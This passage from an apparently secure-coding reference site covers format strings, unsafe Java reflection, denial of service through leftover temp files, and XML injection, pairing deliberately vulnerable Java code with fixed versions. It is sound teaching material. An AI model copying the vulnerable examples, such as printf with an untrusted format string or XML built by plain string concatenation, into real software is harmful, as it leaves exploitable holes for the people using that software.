</pre></div>
</td></tr></table>
<p>In general, it is the best practice to use only fixed format strings. When an external string needs to be printed, print it with the <code>%s</code> specifier instead of using it as the format string.</p>
<h3 id="vulnerable-code-example-3">Vulnerable code example 3</h3>
<p>The example above also applies to Java:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.</span><span class="o">*</span><span class="p">;</span>
<span class="k">class</span> <span class="nc">Example</span> <span class="p">{</span>
  <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">main</span><span class="p">(</span><span class="n">String</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nb">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">printf</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<p>and can be fixed by</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.</span><span class="o">*</span><span class="p">;</span>
<span class="k">class</span> <span class="nc">Example</span> <span class="p">{</span>
  <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">main</span><span class="p">(</span><span class="n">String</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nb">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">printf</span><span class="p">(</span><span class="s2">"</span><span class="si">%s%d%d</span><span class="s2">"</span><span class="p">,</span> <span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/134.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/c.html">C</a>
                <a href="../../../tag/cpp.html">CPP</a>
                <a href="../../../tag/java.html">Java</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1072">Unsafe Reflection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a><ul>
<li><a href="#apis-that-should-be-used-with-care">APIs that should be used with care</a></li>
</ul>
</li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Reflection enables a Java program to analyze and modify itself. In particular, a program can discover the values of field variables and change them <a href="https://wiki.sei.cmu.edu/confluence/display/java/Rule+AA.+References#RuleAA.References-Forman05">Forman 2005</a>, <a href="https://wiki.sei.cmu.edu/confluence/display/java/Rule+AA.+References#RuleAA.References-Sun02">Sun 2002</a>. The Java reflection API includes a method that enables fields that are normally inaccessible to be accessed under reflection.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<h4 id="apis-that-should-be-used-with-care">APIs that should be used with care</h4>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Class</span><span class="o">.</span><span class="na">newInstance</span><span class="o">()</span>
<span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">()</span>
<span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Field</span><span class="o">.</span><span class="na">get</span><span class="o">*()</span>
<span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Field</span><span class="o">.</span><span class="na">set</span><span class="o">*()</span>
<span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span><span class="o">.</span><span class="na">invoke</span><span class="o">()</span>
<span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">concurrent</span><span class="o">.</span><span class="na">atomic</span><span class="o">.</span><span class="na">AtomicIntegerFieldUpdater</span><span class="o">.</span><span class="na">newUpdater</span><span class="o">()</span>
<span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">concurrent</span><span class="o">.</span><span class="na">atomic</span><span class="o">.</span><span class="na">AtomicLongFieldUpdater</span><span class="o">.</span><span class="na">newUpdater</span><span class="o">()</span>
<span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">concurrent</span><span class="o">.</span><span class="na">atomic</span><span class="o">.</span><span class="na">AtomicReferenceFieldUpdater</span><span class="o">.</span><span class="na">newUpdater</span><span class="o">()</span>
</pre></div>
</td></tr></table>
<p>Use of reflection complicates security analysis and can easily introduce security vulnerabilities. Consequently, programmers should avoid using the reflection APIs when it is feasible to do so. Exercise extreme caution when the use of reflection is necessary.</p>
<p>In particular, reflection must not be used to provide access to classes, methods, and fields unless those items are already accessible without the use of reflection. For example, the use of reflection to access or modify fields is not allowed unless those fields are already accessible and modifiable by other means, such as through getter and setter methods.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>To ensure that the security manager will block attempts to access private fields of other classes, never grant the permission ReflectPermission with action suppressAccessChecks.</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<p>In this vulnerable code example, the private fields i and j can be modified using reflection via a Field object:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">FieldExample</span> <span class="o">{</span>
  <span class="kd">private</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">3</span><span class="o">;</span>
  <span class="kd">private</span> <span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">4</span><span class="o">;</span>

  <span class="kd">public</span> <span class="n">String</span> <span class="nf">toString</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">return</span> <span class="s">"FieldExample: i="</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="s">", j="</span> <span class="o">+</span> <span class="n">j</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">zeroI</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">zeroField</span><span class="o">(</span><span class="n">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">Field</span> <span class="n">f</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
      <span class="c1">// Subsequent access to field f passes language access checks</span>
      <span class="c1">// because zeroField() could have accessed the field via</span>
      <span class="c1">// ordinary field references</span>
      <span class="n">f</span><span class="o">.</span><span class="na">setInt</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
      <span class="c1">// Log appropriately or throw sanitized exception; see EXC06-J</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchFieldException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Report to handler</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IllegalAccessException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Report to handler</span>
    <span class="o">}</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">FieldExample</span> <span class="n">fe</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FieldExample</span><span class="o">();</span>
    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">fe</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
    <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">arg</span> <span class="o">:</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">fe</span><span class="o">.</span><span class="na">zeroField</span><span class="o">(</span><span class="n">arg</span><span class="o">);</span>
      <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">fe</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<p>When you must use reflection, make sure that the immediate caller (method) is isolated from hostile code by declaring it private or final, as in this compliant solution:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">FieldExample</span> <span class="o">{</span>
  <span class="c1">// ...</span>

  <span class="kd">private</span> <span class="kt">void</span> <span class="nf">zeroField</span><span class="o">(</span><span class="n">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">// ...</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>When a class must use reflection to provide access to fields, it must also provide the same access using a nonreflection interface:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">FieldExample</span> <span class="o">{</span>
  <span class="c1">// ...</span>

  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">zeroField</span><span class="o">(</span><span class="n">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">// ...</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">zeroI</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
  <span class="o">}</span>
  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">zeroJ</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">j</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cert">
<p>https://wiki.sei.cmu.edu/confluence/display/java/SEC05-J.+Do+not+use+reflection+to+increase+accessibility+of+classes%2C+methods%2C+or+fields <a class="footnote-backref" href="#fnref-cert" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1071">Denial of Service</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a><ul>
<li><a href="#denial-of-service-through-resource-exhaustion">Denial of Service Through Resource Exhaustion</a></li>
<li><a href="#concurrency-related-denial-of-service">Concurrency-Related Denial of Service</a></li>
</ul>
</li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Denial-of-service (DoS) attacks attempt to make a computer resource unavailable or insufficiently available to its intended users. Distributed denial-of-service (DDoS) attacks are launched by two or more persons or bots. DoS and DDoS attacks are generally of greater concern for persistent, server-type systems than for desktop applications; nevertheless, denial of service issues can arise for all classes of application</p>
<p>There are several methods of causing a denial of service:
- Vulnerability attacks involve sending a few well-crafted packets that take advantage of an existing vulnerability in the target machine.
- Resource exhaustion attacks that consume computational resource such as bandwidth, memory, disk space, or processor time.
- Algorithmic attacks (such as on hash functions) by injecting values that force worst-case conditions to exist.
- Bandwidth consumption attacks that consume all available network bandwidth of the victim.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<h4 id="denial-of-service-through-resource-exhaustion">Denial of Service Through Resource Exhaustion</h4>
<p>Denial of service can occur when resource usage is disproportionately large in comparison to the input data that causes the resource usage. Checking inputs for excessive resource consumption may be unjustified for client software that expects the user to handle resource-related problems. Even such client software, however, should check for inputs that could cause persistent denial of service, such as filling up the file system.</p>
<h4 id="concurrency-related-denial-of-service">Concurrency-Related Denial of Service</h4>
<p>Some denial of service attacks operate by attempting to induce concurrency-related problems such as thread deadlock, thread starvation, and race conditions.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>Remove temporary files before termination</li>
<li>Do not synchronize on objects that may be reused</li>
<li>Do not allow untrusted code to terminate the JVM</li>
<li>Do not allow exceptions to expose sensitive information</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">TempFile</span> <span class="o">{</span>
  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">{</span>
    <span class="n">File</span> <span class="n">f</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">"tempnam.tmp"</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">f</span><span class="o">.</span><span class="na">exists</span><span class="o">())</span> <span class="o">{</span>
      <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"This file already exists"</span><span class="o">);</span>
      <span class="k">return</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="n">FileOutputStream</span> <span class="n">fop</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">fop</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="n">f</span><span class="o">);</span>
      <span class="n">String</span> <span class="n">str</span> <span class="o">=</span> <span class="s">"Data"</span><span class="o">;</span>
      <span class="n">fop</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">str</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
    <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
      <span class="k">if</span> <span class="o">(</span><span class="n">fop</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
          <span class="n">fop</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
          <span class="c1">// Handle error</span>
        <span class="o">}</span>
      <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>This Vulnerable code example fails to remove the file upon completion.</p>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">TempFile</span> <span class="o">{</span>
  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">Path</span> <span class="n">tempFile</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">tempFile</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">createTempFile</span><span class="o">(</span><span class="s">"tempnam"</span><span class="o">,</span> <span class="s">".tmp"</span><span class="o">);</span>
      <span class="k">try</span> <span class="o">(</span><span class="n">BufferedWriter</span> <span class="n">writer</span> <span class="o">=</span>
          <span class="n">Files</span><span class="o">.</span><span class="na">newBufferedWriter</span><span class="o">(</span><span class="n">tempFile</span><span class="o">,</span> <span class="n">Charset</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"UTF8"</span><span class="o">),</span>
                                  <span class="n">StandardOpenOption</span><span class="o">.</span><span class="na">DELETE_ON_CLOSE</span><span class="o">))</span> <span class="o">{</span>
        <span class="c1">// Write to file</span>
      <span class="o">}</span>
      <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Temporary file write done, file erased"</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">FileAlreadyExistsException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">System</span><span class="o">.</span><span class="na">err</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"File exists: "</span> <span class="o">+</span> <span class="n">tempFile</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Some other sort of failure, such as permissions.</span>
      <span class="n">System</span><span class="o">.</span><span class="na">err</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Error creating temporary file: "</span> <span class="o">+</span> <span class="n">x</span><span class="o">);</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cert1">
<p>https://wiki.sei.cmu.edu/confluence/display/java/Denial+of+Service <a class="footnote-backref" href="#fnref-cert1" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-cert2">
<p>https://wiki.sei.cmu.edu/confluence/display/java/FIO03-J.+Remove+temporary+files+before+termination <a class="footnote-backref" href="#fnref-cert2" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1099">XML Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 3 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The extensible markup language (XML) is designed to help store, structure, and transfer data. Because of its platform independence, flexibility, and relative simplicity, XML has found use in a wide range of applications. However, because of its versatility, XML is vulnerable to a wide spectrum of attacks, including XML injection.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>A user who has the ability to provide input string data that is incorporated into an XML document can inject XML tags. These tags are interpreted by the XML parser and may cause data to be overridden.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications.</p>
</li>
<li>
<p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules.</p>
</li>
<li>
<p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist).</p>
</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>In this vulnerable code example, a client method uses simple string concatenation to build an XML query to send to a server. XML injection is possible because the method performs no input validation.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.BufferedOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">OnlineStore</span> <span class="o">{</span>
  <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">createXMLStreamBad</span><span class="o">(</span><span class="kd">final</span> <span class="n">BufferedOutputStream</span> <span class="n">outStream</span><span class="o">,</span>
      <span class="kd">final</span> <span class="n">String</span> <span class="n">quantity</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">xmlString</span> <span class="o">=</span> <span class="s">"&lt;item&gt;\n&lt;description&gt;Widget&lt;/description&gt;\n"</span>
        <span class="o">+</span> <span class="s">"&lt;price&gt;500&lt;/price&gt;\n"</span> <span class="o">+</span> <span class="s">"&lt;quantity&gt;"</span> <span class="o">+</span> <span class="n">quantity</span>
        <span class="o">+</span> <span class="s">"&lt;/quantity&gt;&lt;/item&gt;"</span><span class="o">;</span>
    <span class="n">outStream</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">xmlString</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
    <span class="n">outStream</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<p>Depending on the specific data and command interpreter or parser to which data is being sent, appropriate methods must be used to sanitize untrusted user input. This compliant solution validates that quantity is an unsigned integer:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.BufferedOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">OnlineStore</span> <span class="o">{</span>
  <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">createXMLStream</span><span class="o">(</span><span class="kd">final</span> <span class="n">BufferedOutputStream</span> <span class="n">outStream</span><span class="o">,</span>
      <span class="kd">final</span> <span class="n">String</span> <span class="n">quantity</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">NumberFormatException</span> <span class="o">{</span>
    <span class="c1">// Write XML string only if quantity is an unsigned integer (count).</span>
    <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="n">Integer</span><span class="o">.</span><span class="na">parseUnsignedInt</span><span class="o">(</span><span class="n">quantity</span><span class="o">);</span>
    <span class="n">String</span> <span class="n">xmlString</span> <span class="o">=</span> <span class="s">"&lt;item&gt;\n&lt;description&gt;Widget&lt;/description&gt;\n"</span>
        <span class="o">+</span> <span class="s">"&lt;price&gt;500&lt;/price&gt;\n"</span> <span class="o">+</span> <span class="s">"&lt;quantity&gt;"</span> <span class="o">+</span> <span class="n">count</span> <span class="o">+</span> <span class="s">"&lt;/quantity&gt;&lt;/item&gt;"</span><span class="o">;</span>
    <span class="n">outStream</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">xmlString</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
    <span class="n">outStream</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>A more general mechanism for checking XML for attempted injection is to validate it using a Document Type Definition (DTD) or schema. The schema must be rigidly defined to prevent injections from being mistaken for valid XML. Here is a suitable schema for validating our XML snippet:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nt">&lt;xs:schema</span> <span class="na">xmlns:xs=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span><span class="nt">&gt;</span>
<span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"item"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;xs:complexType&gt;</span>
    <span class="nt">&lt;xs:sequence&gt;</span>
      <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"description"</span> <span class="na">type=</span><span class="s">"xs:string"</span><span class="nt">/&gt;</span>
      <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"price"</span> <span class="na">type=</span><span class="s">"xs:decimal"</span><span class="nt">/&gt;</span>
      <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"quantity"</span> <span class="na">type=</span><span class="s">"xs:nonNegativeInteger"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;/xs:sequence&gt;</span>
  <span class="nt">&lt;/xs:complexType&gt;</span>
<span class="nt">&lt;/xs:element&gt;</span>
<span class="nt">&lt;/xs:schema&gt;</span>
</pre></div>
</td></tr></table>
<p>Using a schema or DTD to validate XML is convenient when receiving XML that may have been loaded with unsanitized input. If such an XML string has not yet been built, sanitizing input before constructing XML yields better performance.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
